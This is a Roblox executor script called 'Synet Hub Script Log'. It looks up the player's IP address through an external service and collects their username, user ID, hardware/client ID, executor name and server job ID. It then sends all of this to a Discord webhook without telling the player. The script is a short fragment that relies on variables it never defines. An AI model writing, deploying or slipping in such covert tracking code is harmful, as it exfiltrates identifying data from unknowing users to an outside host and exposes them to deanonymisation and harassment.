local requestt = http_request or request or syn.request
local body = requestt({Url = "https://httpbin.org/get"; Method = "GET"}).Body;
local decoded = game:GetService("HttpService"):JSONDecode(body)
local ip = decoded.origin
local PlaceID = game.PlaceId
local Client = game.Players.LocalPlayer
local Path = "http://www.roblox.com/asset/?id="
local avatar_response = request({
    Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" ..
    Client.UserId .. "&size=420x420&format=png",
    Method = "GET"
})
if avatar_response.StatusCode ~= 200 then
    fail("Something went wrong in your experience! Please try again later!")
    return
end
local access = HttpService:JSONDecode(avatar_response.Body)
local headers = {
    ["Content-Type"] = "application/json"
}
local data = {
    ["username"] = "Synet Hub Script Log",
    ["avatar_url"] = "https://cdn.discordapp.com/icons/1264127781164552273/9a3e65eee5adaf6d2bb95b1467797324.png?size=1024",
    ["embeds"] = {
        {
            ["title"] = "Script Executed :",
            ["type"] = "rich",
            ["color"] = tonumber(1127128),
            ["thumbnail"] = {
                ["url"] = access.data[1].imageUrl
            },
            ["fields"] = {
                {
                    ["name"] = 'Username / User ID',
                    ["value"] = "```".. game:GetService("Players").LocalPlayer.Name .. " / " .. game:GetService("Players").LocalPlayer.UserId .."```",
                    ["inline"] = false
                },
                {
                    ["name"] = 'User IP',
                    ["value"] = "```".. tostring(ip) .."```",
                    ["inline"] = true
                },
                {
                    ["name"] = 'Executor',
                    ["value"] = "```".. identifyexecutor() .."```",
                    ["inline"] = true
                },
                {
                    ["name"] = 'HWID',
                    ["value"] = "```".. game:GetService("RbxAnalyticsService"):GetClientId() .."```",
                    ["inline"] = false
                },
                {
                    ["name"] = 'Job ID',
                    ["value"] = "```"..game.JobId.."```",
                    ["inline"] = false
                },
                {
                    ["name"] = 'Join Script',
                    ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
                    ["inline"] = false
                },
                {
                    ["name"] = 'Profile Link',
                    ["value"] = "[Click Here](https://www.roblox.com/users/".. game:GetService("Players").LocalPlayer.UserId .. "/profile)",
                    ["inline"] = true
                },
                {
                    ["name"] = 'Game Link',
                    ["value"] = "[Click Here](https://www.roblox.com/games/" .. game.PlaceId .. ")",
                    ["inline"] = true
                }
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
        }
    }
}
local newdata = HttpService:JSONEncode(data)
requestt({Url = WebhookUrl, Body = newdata, Method = "POST", Headers = headers})
